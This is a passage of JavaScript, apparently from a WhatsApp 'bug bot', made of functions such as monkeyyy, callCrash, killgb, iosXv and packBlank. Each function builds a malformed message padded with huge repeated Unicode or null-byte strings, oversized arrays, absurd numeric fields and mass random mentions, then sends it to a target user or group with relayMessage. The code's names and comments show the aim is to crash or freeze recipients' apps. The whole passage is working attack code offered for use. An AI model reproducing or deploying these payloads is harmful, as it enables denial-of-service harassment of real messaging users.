locationMessage: {
degreesLatitude: 1010101,
degreesLongitude: 1010101,
name: "funny loc ¿? " + "ꦽ".repeat(60000),
address: ".sevrin444 ( @rraldz )",
url: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/" + "ꦽ".repeat(60000),
clickToWhatsappCall: true,
contextInfo: {
businessMessageForwardInfo: {
businessOwnerJid: target
},
mentionedJid: [target,"13135550002@s.whatsapp.net"]
}
}
},
{ /* participant: {jid: target} */ }
)
}

async function monkeyyy(sock, target) {
    const msg = {
        imageMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc?ccb=11-4&oh=01_Q5Aa5AH0D6R2dyqyyJ_TEt83mdD4fNwOuNOGNARKMWy22lI6vw&oe=6A76C689&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/jpeg",
            fileSha256: "o+iSkGm6O3/g7uBR/aChsjSKs7EcayA8lV/h7yaPsq0=",
            viewOnce: true,
            caption: "MONKEYFALSE" + "ြ".repeat(100000),
            fileLength: "71831",
            height: 1024,
            width: 1536,
            mediaKey: "RHS1mPMKv23WPGPM8GWd5fsXzZh1dLdG04yIrL13FB4=",
            fileEncSha256: "+40DMIFaOid0dVofoUAQkY8v6cfjkxFUqJWy6gSwfkc=",
            directPath: "/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc?ccb=11-4&oh=01_Q5Aa5AH0D6R2dyqyyJ_TEt83mdD4fNwOuNOGNARKMWy22lI6vw&oe=6A76C689&_nc_sid=5e03e0",
            mediaKeyTimestamp: "1783579277",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIADAASAMBIgACEQEDEQH/xAAsAAEAAgMBAAAAAAAAAAAAAAAAAgQBAwUGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADzIDZM0AM2CskI9Dn2jucyxpLbn4N+2NUpMCVmmJz0i1isM4AD/8QAKhAAAgICAQEFCQEAAAAAAAAAAQIAAwQREjEQFCEwURMiNBMyQmFigZH/2gAIAQEAAT8A8tKrH+FCY9Jq+Z19O3R9JViXWglVjrxYjswsQ2uGYe4JfZkKQmLQAgiUX5GYBaszMeiukOniN6id0GK1wpA1Me321wVKhtv8EzMnu+6aWH5jEk7PZQ+QQUqYzldj1bsv/kOS9aG3kObyzKc1hFfr1loZhVQh3AExAFLgE9ZbkUhStdY2fuMJ3EUMfE6EbIFY40jX7TkxOy0ULYWLvqCuoHYt+m45Feilmyw8YST1O/M//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAgEBPwB//8QAFBEBAAAAAAAAAAAAAAAAAAAAMP/aAAgBAwEBPwB//9k=",
            contextInfo: {
                featureEligibilities: { cannotBeRanked: true, canBeReshared: true },
                pairedMediaType: "NOT_PAIRED_MEDIA",
                statusSourceType: "MUSIC_STANDALONE"
            },
            annotations: [
                {
                    polygonVertices: [
                        { x: 0.17499999701976776, y: 0.3379453122615814 },
                        { x: 0.824999988079071, y: 0.3379453122615814 },
                        { x: 0.824999988079071, y: 0.6620468497276306 },
                        { x: 0.17499999701976776, y: 0.6620468497276306 }
                    ],
                    shouldSkipConfirmation: true,
                    embeddedContent: {
                        embeddedMusic: {
                            musicContentMediaId: "2261401457948346",
                            songId: "849859527815275",
                            author: "MONKEY" + "ြ".repeat(55000),
                            title: "ြ".repeat(45000),
                            artworkDirectPath: "/v/t62.76458-24/568311115_4528169627440664_4559757974106869948_n.enc?ccb=11-4&oh=01_Q5Aa5AGs28VMFVXkcn0w9n-YUhiBwEPKyIwEcjWZLHm7mUgOsQ&oe=6A786B6E&_nc_sid=5e03e0",
                            artworkSha256: "FROyKnRoHfLzDwmz5tED8K3nmdK+4Uihn2ucHBZDjPI=",
                            artworkEncSha256: "y/SkheY3BoGhndQlmR6icfLtMtI4FjjRi5y3bsX13jw=",
                            artworkMediaKey: "s5VCH/gb/YjDXhek47MVcsHjVV3/lOHOYaDe72eodXw=",
                            artistAttribution: "https://www.instagram.com/_u/ndarboy_genk",
                            countryBlocklist: "WEs=",
                            isExplicit: false
                        }
                    },
                    embeddedAction: true
                }
            ]
        }
    };

    const msg2 = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 2,
                            messageText: `@${target.split('@')[0]}`
                        },
                        {
                            messageType: 3,
                            mediaMetadata: {}
                        },
                        {
                            messageType: 4,
                            tableMetadata: {
                                title: "\0",
                                rows: [
                                    {
                                        items: [],
                                        isHeading: true
                                    }
                                ]
                            }
                        }
                    ],
                    contextInfo: {
                        mentionedJid: [target],
                        featureEligibilities: Array.from({ length: 99000 }, () => ({
                            canReceiveMultiReact: true
                        })),
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "867051314767696@bot"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg3 = {
        header: {
            title: "MONKEY",
            hasMediaAttachment: false
        },
        body: {
            text: "MONKEY HRE"
        },
        footer: {
            text: "\r"
        },
        nativeFlowMessage: {
            buttons: [
                {
                    name: "booking_confirmation",
                    buttonParamsJson: JSON.stringify({
                        icon: "default",
                        start_datetime: "2026-06-10T10:37:10.967Z",
                        end_datetime: "2026-06-10T10:47:10.967Z",
                        location: "epZinc Network",
                        booking_url: "t.me/iamsatzZX",
                        phone_number: "\0".repeat(12000),
                        booking_management_url: "t.me/LUFFYLOXTAL",
                        description: "ြ".repeat(20000),
                        email: "\u0000".repeat(2000),
                        display_text: "KEY" + "ြ".repeat(19000),
                        display_content: {
                            display_language: "id",
                            display_meeting_type: "KEY¿" + "ြ".repeat(15000),
                            display_bottom_sheet_header: "ြ".repeat(17000),
                            display_add_to_calendar_cta_text: "MONKEY",
                            display_view_on_maps_cta_text: "MONKEY",
                            display_manage_booking_cta_text: "ြ".repeat(22000),
                            display_manage_booking_not_supported_text: "NOT AVAILABLE",
                            display_read_more: "READ MORE"
                        }
                    })
                }
            ],
            messageParamsJson: ""
        }
    };

    const msg4 = {
        interactiveMessage: {
            body: {
                text: "\u200b".repeat(60000)
            },
            nativeFlowMessage: {
                buttons: "one_crash_message".repeat(20000)
            }
        }
    };

    const msg5 = {
        documentMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7119-24/xxx.enc",
            mimetype: "application/vnd.android.package-archive",
            fileSha256: Buffer.alloc(32, 0x01).toString('base64'),
            fileLength: 999999999999999,
            fileName: "\u0000".repeat(30000) + "Update.apk",
            pageCount: 999999999,
            mediaKey: Buffer.alloc(32, 0x02).toString('base64'),
            fileEncSha256: Buffer.alloc(32, 0x03).toString('base64'),
            directPath: "/v/t62.7119-24/xxx.enc",
            mediaKeyTimestamp: Date.now(),
            caption: "\u0000".repeat(200000) + "Gren.",
            jpegThumbnail: Buffer.alloc(500000, 0x01),
            contextInfo: {
                externalAdReply: {
                    title: "Software lu kena virus jembut",
                    body: "Jembut kon",
                    mediaType: 1,
                    thumbnailUrl: "https://" + "\u0000".repeat(50000) + ".com",
                    mediaUrl: "https://" + "\u600b".repeat(50000) + ".com",
                    sourceUrl: "https://" + "\u200B".repeat(50000) + ".com",
                    renderLargerThumbnail: true,
                    showAdAttribution: true
                }
            }
        }
    };

    const msg6 = {
        interactiveMessage: {
            body: {
                text: "Jembut",
                format: "DEFAULT"
            },
            nativeFlowMessage: {
                buttons: [
                    {
                        name: "cta_url",
                        buttonParamsJson: JSON.stringify({
                            url: "https://t.me/GrenTzy?auto=1",
                            display_text: "Gren"
                        })
                    }
                ],
                messageVersion: 1
            },
            contextInfo: {
                externalAdReply: {
                    title: "GrenX",
                    body: "No Gren",
                    mediaType: 1,
                    thumbnailUrl: "https://" + "\0".repeat(100000) + ".jpg",
                    showAdAttribution: true
                }
            }
        }
    };

    const msg7 = {
        interactiveMessage: {
            body: { text: "Monkey" },
            nativeFlowMessage: {
                buttons: [
                    { name: 'catalog_message', buttonParamsJson: "{}" },
                    {
                        name: "booking_status",
                        buttonParamsJson: JSON.stringify({})
                    },
                    {
                        name: "review_and_pay",
                        buttonParamsJson: JSON.stringify({
                            currency: "IDR",
                            total_amount: { value: 0, offset: 100 },
                            reference_id: "x",
                            type: "physical-goods",
                            order: {
                                status: "payment_requested",
                                subtotal: { value: 0, offset: 100 },
                                order_type: "ORDER",
                                items: [
                                    {
                                        name: "x",
                                        amount: { value: 0, offset: 100 },
                                        quantity: 9999
                                    }
                                ]
                            }
                        })
                    }
                ],
                messageParamsJson: '{}'
            },
            contextInfo: {
                mentionedJid: Array.from({ length: 1999 }, () =>
                    "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                ),
                isForwarded: true,
                externalAdReply: {
                    title: "monkeyCrasher",
                    body: "monkey",
                    mediaType: "IMAGE",
                    thumbnailUrl: "https://i.imgur.com/xxx.jpg",
                    sourceUrl: "https://AlzSync-í.devLevi4thanCrasher",
                    renderLargerThumbnail: true
                }
            }
        }
    };

    const msg8 = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "🥂🍷ꦾØ$Vorcelight ¿🥂🍷⃰",
                        extra: "\u31040"
                    },
                    nativeFlowMessage: {
                        extra: "\u31040",
                        buttons: Array.from({ length: 80000 }, () => ({})),
                        extra1: "\u0000".repeat(80000),
                        extra2: "\u0000".repeat(50000)
                    }
                }
            }
        }
    };

    const msg9 = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 8,
                            latexMetadata: {
                                text: "\0",
                                expressions: [
                                    {
                                        latexExpression: "\0",
                                        width: 99999999
                                    }
                                ]
                            }
                        }
                    ],
                    contextInfo: {
                        isForwarded: true,
                        forwardOrigin: 4
                    }
                }
            }
        }
    };

    const msg10 = {
        interactiveMessage: {
            body: { text: "🥂🍷ꦾØ$Vorcelight PROJECT¿‽🥂🍷" },
            nativeFlowMessage: {
                messageParamsJson: "{".repeat(25000),
                buttons: [
                    { name: "share_phone", buttonParamsJson: "{}" },
                    { name: "buy_now", buttonParamsJson: "{}" }
                ]
            }
        }
    };

    await sock.relayMessage(target, msg, { participant: { jid: target } });
    await sock.relayMessage(target, msg2, { participant: { jid: target } });
    await sock.relayMessage(target, msg3, { participant: { jid: target } });
    await sock.relayMessage(target, msg4, { participant: { jid: target } });
    await sock.relayMessage(target, msg5, { participant: { jid: target }, noSelfSync: true });
    await sock.relayMessage(target, msg6, { participant: { jid: target }, noSelfSync: true });
    await sock.relayMessage(target, msg7, { participant: { jid: target } });
    await sock.relayMessage(target, msg8, { participant: { jid: target } });
    await sock.relayMessage(target, msg9, { participant: { jid: target } });
    await sock.relayMessage(target, msg10, { participant: { jid: target } });

    console.log("Coba aja work kabarin ini function fc click Zvora gue ubah jadi no click");
}

async function callCrash(sock, target) {
  const vnxmbgdly = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          contextInfo: {
            participant: target,
            mentionedJid: [
              '0@s.whatsapp.net',
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  '1' + Math.floor(Math.random() * 900000) + '@s.whatsapp.net',
              ),
            ],
            body: {
              text: 'VnX',
              format: 'DEFAULT',
            },
            footer: {
              text: '\u0000'.repeat(25000),
              format: 'DEFAULT',
            },
            nativeFlowResponseMessage: {
              name: 'galaxy_message',
              paramsJson: `{\"flow_cta\":{\"title\":${"\u0000".repeat(990000)}}}`,
              version: 3,
             },
           },
         },
       },
     },
   };

  await sock.relayMessage(target, vnxmbgdly, {
    participant: { jid: target },
  });
}

async function Krocox(sock, targetJid) {
    try {
        
        const msg1 = {
            viewOnceMessageV2: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "one_crash_message".repeat(10000),
                              buttons:
                              "one_crash_message".repeat(30000),
                            
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 1236 }, () => ({}))
                            }
                        },
               nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                    icon: "document",
                    title: "°deffa is here°¿",
                    sections: Array.from({ length: 5055 }, () => ({}))
                })
                      }
                    
                    }
                }
            }
        };

        const msg2 = {
              groupStatusMessageV2: {
               message: { 
                    interactiveMessage: {
                        body: {
                            text: " "
                        },
                        nativeFlowMessage: {
                            buttons: "cta_call".repeat(20000) + "cta_reply".repeat(30000),
                            nativeFlowResponseMessage: {
                                buttons: Array.from({ length: 9877 }, () => ({}))
                            },
                            messageParamsJson: "\uFDFD".repeat(30000)
                        }
                    },
                nativeFlowInfo: {
                name: "single_select",
                paramsJson: JSON.stringify({
                    icon: "document",
                    title: "°deffa is here°¿",
                    sections: Array.from({ length: 5055 }, () => ({}))
                })
          }
}
}
            
        };

        await sock.relayMessage(targetJid, msg1, {});
        await new Promise(resolve => setTimeout(resolve, 3000));
        await sock.relayMessage(targetJid, msg2, {});
        
    } catch (error) {
        console.error("❌ Error:", error);
    }
}


async function groupBan(sock, target) {
  if (!target.endsWith("@g.us")) throw "@g.us server required";
  try {
    await sock.groupParticipantsUpdate(target, ["13135550002@s.whatsapp.net"], "add")
  } catch (e) {
    throw e
  }
}

async function killgb(sock, target) {
    try {
        const msg = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: {
                            text: "Deffa is here".repeat(10000)
                        },
                        footer: {
                            text: "\uFDFD" + "\uFDFD".repeat(110000)
                        },
                        nativeFlowMessage: {
                            extra: "\uFDFD".repeat(110000),
                            buttons: "\uFDFD".repeat(110000),
                            nativeFlowResponsMessage: {
                                buttons: "\u0000".repeat(110000)
                            }
                        }
                    }
                }
            }
        };

        await sock.relayMessage(target, msg, {});
    } catch (err) {
        console.error("Error:", err);
    }
}

async function iosXv(client, target) {
  await client.relayMessage(
    target,
    {
      requestPhoneNumberMessage: {
        skipType: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
        contextInfo: {
          remoteJid: "status@broadcast",
          externalAdReply: {
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            body: "𑇂𑆵𑆴𑆿".repeat(15000),
            mediaType: "DOCUMENT",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
            sourceUrl: `https://${"𑇂𑆵𑆴𑆿".repeat(15000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior-iOS),,〽️/`,
          },
          quotedMessage: {
            conversation: "#Vault•¿🎭?•(Superior-iOS)" 
                          + "𑇂𑆵𑆴𑆿".repeat(15000)
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
          },
          mentionedJid: ["0@s.whastapp.net"],
          forwardedNewsletterMessageInfo: {
            newsletterJid: "666-666@g.us",
            serverMessageId: 1,
            newsletterName: "؂ن؃؄ٽ؂ن؃",
            contentType: "UPDATE",
          },
        },
      },
    },
    {
      participant: {jid: target}
    }
  );
}

async function IMGFRZ(sock, target) {
  await sock.relayMessage(target,
    {
      videoMessage: {
        caption: "⟨〽⃟💛✩ ᜴𝐕࿆𝐬𝐏࿆ꢵ ✩💛⃟〽⟩" + "ꦽ".repeat(65000),
        url: "https://mmg.whatsapp.net/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "xx78ONox8l/eqf3pYnJcMwiBCse3FVLKkk9jdfP5oPI=",
        fileLength: "9999999999999999e+9999999",
        seconds: 999999999,
        mediaKey: "LIHnYC8TN+vB3X9ed+nbu04NRdJ5PCmnHLXwu26o7RE=",
        height: 999999999999,
        width: -999999999999,
        fileEncSha256: "6a5lF9qeH/js+wV8W9fsrgVlXTSCd5htFyLKOCqzoHc=",
        directPath: "/v/t62.7161-24/535130660_2056204551619999_9212868137245798859_n.enc?ccb=11-4&oh=01_Q5Aa3wEKzQWbFu2-T6XWU7V5bRXnbKmD5r1F0y2TneH5Hy7seg&oe=69C6B8C6&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1772045071",
        jpegThumbnail: Buffer.alloc(0),
        contextInfo: {
          pairedMediaType: "NOT_PAIRED_MEDIA",
          statusSourceType: "IMAGE",
          isForwarded: true,
          forwardingScore: 9999,
          remoteJid: "VsP`Team",
          externalAdReply: {
            title: "🦋⃰͡°͜͡⃟⿻ 𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸 " + "ꦽ".repeat(60000),
            body: "ꦽ".repeat(60000),
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            containsAutoReply: true,
            showAdAttribution: true,
            thumbnail: { url: "https://files.catbox.moe/0iq0n3.jpg" },
            sourceUrl: `https://${"ꦽ".repeat(60000)}.wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/`,
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "13135559999@s.whatsapp.net",
            businessDescrbiption: " # 𝖵𝖺𝗎𝗅𝗍 - 𝖲𝗎𝗉𝖾𝗋𝗂𝗈𝗋 〽️🎭 ",
          },
          mentions: target,
          groupMentions: Array.from({ length: 1900 }, () => ({
            groupJid: `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`,
            groupSubject: "X"
          })),
          quotedMessage: {
            viewOnceMessage: {
              message: {
                interactiveResponseMessage: {
                  body: {
                    text: "Sent",
                    format: "DEFAULT"
                  },
                  nativeFlowResponseMessage: {
                    name: "call_permission_request",
                    paramsJson: "{",
                    version: 3
                  }
                }
              }
            }
          },
          statusAttributions: [
            {
              type: "MUSIC",
              music: {
                authorName: "ꦽ".repeat(9999),
                songId: "243234016584833",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999),
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                isExplicit: false,
              }
            },
            {
              type: "GROUP_STATUS",
              music: {
                authorName: "ꦽ".repeat(9999),
                songId: "243234016584836",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 𝐕꙰𝐬꙰𝐏꙰--𝐑𝟒𝐋𝐃𝐙 𒀸" + "ꦽ".repeat(9999),
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                isExplicit: false,
              }
            }
          ],
        },
        streamingSidecar: "/PFxy0I/BUf8vbt/pW0sJ2j35YorqVHaII+thZ6V7yBUnox3c4QatbRETk7b2zb3nlQ=",
        thumbnailDirectPath: "/v/t62.36147-24/593729676_1666419884645510_6285328431371507107_n.enc?ccb=11-4&oh=01_Q5Aa3wE2rCOu-EHBRz-yTOwRKjTlNItBVyfvepZpPpsmtDULhw&oe=69C69DFE&_nc_sid=5e03e0",
        thumbnailSha256: "Cjw/0a5/5hzXKuDb6Rku26kazUYCZo0pyK8Xz35ecmo=",
        thumbnailEncSha256: "DNT9rfoBh/sCwpuOIr27W/9DwsUjP/BhZjpy3iPqFG0=",
        annotations: [
          {
            location: {
              degreesLongitude: 0,
              degreesLatitude: 0,
              name: "#Vault•¿🎭?•(Superior)"
            }, 
            polygonVertices: [
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
              { x: 999999999999999999, y: -999999999999999999 },
            ],
            shouldSkipConfirmation: true,
            embeddedContent: {
              embeddedMusic: {
                musicContentMediaId: "34028249360153165",
                songId: "243234016584833",
                title: "Baon Cikadap" + "ꦽ".repeat(9999),
                author: "𖥞 VORCELIGHT PROJECT  NI BG𒀸" + "ꦽ".repeat(9999),
                artworkDirectPath: "/v/t62.76458-24/33007276_830604333385904_5311398360527691061_n.enc?ccb=11-4&oh=01_Q5Aa3wH56VfaFfiQnInWSCwFZPy-UZPFQtqD1IGRFYWJIs_Tjg&oe=69C6BA9E&_nc_sid=5e03e0",
                artworkSha256: "ea9OLJCdRGuahQJyYKqrvHkaQg01CYjJkCEjCid2kRg=",
                artworkEncSha256: "Av+nl2omDopYfspLMfiR7w9+DiynCncYllNpze9z8PQ=",
                artistAttribution: "https://wa.me/settings/linked_devices/#Vault•¿🎭?•(Superior),,〽️/",
                countryBlocklist: "",
                isExplicit: false,
                artworkMediaKey: "eSQ0o4UHYhwmUuEcGXesztrXm/tlTvDRBwoTF8dgVNA=",
                musicSongStartTimeInMs: "999999999",
                derivedContentStartTimeInMs: "999999999",
                overlapDurationInMs: "999999999",
              },
            },
            embeddedAction: true,
          },
        ],
      },
    },
    {
      participant: { jid: target },
    }
  );
}

async function blankGroup(client, target) {
  await client.relayMessage(
    target,
    {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: "1@newsletter",
            newsletterName: "ꦽ".repeat(60000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(60000),
            inviteExpiration: Date.now() * 999e+21
          }
        }
      },
      nativeFlowMessage: {
        messageParamsJson: "{}",
        buttons: [
          {
            name: "call_permission_request",
            buttonParamsJson: ""
          }
        ]
      },
      contextInfo: {
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1999 }, () =>
            `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
          )
        ],
      },
    },
    {}
  );
  
  await client.relayMessage(target,
    {
      extendedTextMessage: {
        text: "⤻꙳͙͡༑VORCRLIGHT¿ PROJECT" + "ꦽ".repeat(60000),
        contextInfo: {
          quotedMessage: {
            groupInviteMessage: {
              groupJid: "888-62888@g.us",
              inviteCode: "Xx".repeat(10000),
              inviteExpiration: 999e+999 * Date.now(),
              groupName: "ꦽ".repeat(60000),
              caption: "ꦽ".repeat(60000),
              jpegThumbnail: ""
            }
          },
          mentionedJid: [
            "13135550002@s.whatsapp.net",
            ...Array.from({ length: 1999 }, () =>
              `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
            )
          ],
        }
      }
    },
    {}
  );
}
async function packBlank(sock, target) {
console.log(`𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`);
  await sock.relayMessage(
    target,
    {
      stickerPackMessage: {
        stickerPackId: "X",
        name: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        publisher: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        stickers: [
          {
            fileName: "FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "wi+jDzUdQGV2tMwtLQBahUdH9U-sw7XR2kCkwGluFvI=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "jytf9WDV2kDx6xfmDfDuT4cffDW37dKImeOH+ErKhwg=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "ItSCxOPKKgPIwHqbevA6rzNLzb2j6D3-hhjGLBeYYc4=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1EFmHJcqbqLwzwafnUVaMElScurcDiRZGNNugENvaVc=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3UCz1GGWlO0r9YRU0d-xR9P39fyqSepkO+uEL5SIfyE=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "1cOf+Ix7+SG0CO6KPBbBLG0LSm+imCQIbXhxSOYleug=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "5R74MM0zym77pgodHwhMgAcZRWw8s5nsyhuISaTlb34=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
          {
            fileName: "3c2l1jjiGLMHtoVeCg048To13QSX49axxzONbo+wo9k=.webp",
            isAnimated: false,
            emojis: ["😮‍💨"],
            accessibilityLabel: "otax",
            isLottie: true,
            mimetype: "application/pdf",
          },
        ],
        fileLength: "9999999999999",
        fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
        fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
        mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
        directPath:
          "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc?ccb=11-4&oh=01_Q5AaIJUsG86dh1hY3MGntd-PHKhgMr7mFT5j4rOVAAMPyaMk&oe=67EF584B&_nc_sid=5e03e0",
        contextInfo: {
          quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000
                },
                forwardedAiBotMessageInfo: {
                  botName: "META AI",
                  botJid: Math.floor(Math.random() * 5000000) + "@s.whatsapp.net",
                  creatorName: "Bot"
                }
            }
        },
        packDescription: "σƭαא ɦεɾε" + "؂ن؃؄ٽ؂ن؃".repeat(10000),
        mediaKeyTimestamp: "1741150286",
        trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
        thumbnailDirectPath:
          "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc?ccb=11-4&oh=01_Q5AaIB8lN_sPnKuR7dMPKVEiNRiozSYF7mqzdumTOdLGgBzK&oe=67EF38ED&_nc_sid=5e03e0",
        thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
        thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
        thumbnailHeight: 252,
        thumbnailWidth: 252,
        imageDataHash:
          "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
        stickerPackSize: "999999999",
        stickerPackOrigin: "1",
      },
    }, { participant: { jid: target } });
}
async function AyunBelovedxnxxahyaa(sock, target) {
    console.log('𝗢𝘁𝗮𝘅 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴');

    const { nodes, shouldIncludeDevicelentity } = await sock.emit('getNodes');

    const message = {
        extendedTextMessage: {
            text: "⸙ᵒᵗᵃˣнοω αяє γου?¿" + "ꦾ".repeat(50000) + "\n\nJust OTAX" + "\0".repeat(100),
            matchedText: "https://t.me/Otapengenkawin",
            description: "⸙ᵒᵗᵃˣнοω αяє γου?¿",
            title: "ꦽ".repeat(20000),
            previewType: 6,
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCAwYBBQEBAAAAAAAAAAAAAAAAAAAAA//aAAwDAQACEQMQAA+q6BooLAAFIkkgAJIsAAJEsAAJYACWC//9oACAEBAAEFAu7Z25Z9LiY3XbLs+d2s3R8/tYm7m0y7bLlyz25dV1ZYsuXKXLly9y5cuXL3Lly5cuXL3Lly5cuXL3Lly5f/EABYRAAMAAAAAAAAAAAAAAAAAAAEQYf/aAAgBAgEBPwFQz//EABYRAAMAAAAAAAAAAAAAAAAAAAEQUf/aAAgBAwEBPwEUz//Z",
            paymentLinkMetadata: {
                button: { displayText: "Love U My Ayun" },
                header: { headerType: 1 },
                provider: { paramsJson: "{".repeat(10000) }
            },
            contextInfo: {
                isForwarded: true,
                forwardingScore: 9999,
                participant: target,
                remoteJid: "status@broadcast",
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1995 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)
                ],
                quotedMessage: {
